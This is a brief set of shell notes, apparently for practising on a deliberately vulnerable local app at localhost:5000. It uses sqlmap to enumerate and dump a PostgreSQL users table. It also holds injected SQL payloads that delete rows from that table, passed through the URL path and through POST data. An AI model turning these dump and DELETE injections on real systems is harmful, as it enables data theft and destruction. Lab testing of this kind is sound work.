# install sql map
git clone https://github.com/sqlmapproject/sqlmap.git


python3 sqlmap.py -u "http://localhost:5000/user/test" --risk=3 --level=5 --dbs
python3 sqlmap.py -u "http://localhost:5000/user/test" --tables -D public.vulnerable_db
python3 sqlmap.py -u "http://localhost:5000/user/test" --columns -T public.users -D vulnerable_db
python3 sqlmap.py -u "http://localhost:5000/user/test" --dump -T users -D vulnerable_db

# --header="Authorization: Bearer your_jwt_token" \

python3 sqlmap.py -u "http://localhost:5000/user/' OR 1=1; DELETE FROM users WHERE id = (SELECT MIN(id) FROM users); --" --dbs

sqlmap -u "http://localhost:5000/user/test" --data="username=test'; DELETE FROM users WHERE username LIKE '%t%'-- uGie" --batch

sqlmap -u "http://localhost:5000/user/test" --dbms=PostgreSQL --tables --dump

sqlmap -u "http://localhost:5000/user/test" --dbms=PostgreSQL -D vulnerable_db -T users --dump

# http://localhost:5000/user/test'%20OR%201=1--%20vLod
sqlmap -u "http://localhost:5000/user/test" --dbms=PostgreSQL --all

